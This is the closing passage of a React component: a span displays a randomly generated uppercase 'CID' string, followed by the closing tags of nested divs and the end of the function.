                    <span>CID: {Math.random().toString(36).substring(7).toUpperCase()}</span>
                 </div>
              </div>
           </div>
        </div>
      )}
    </div>
  );
}
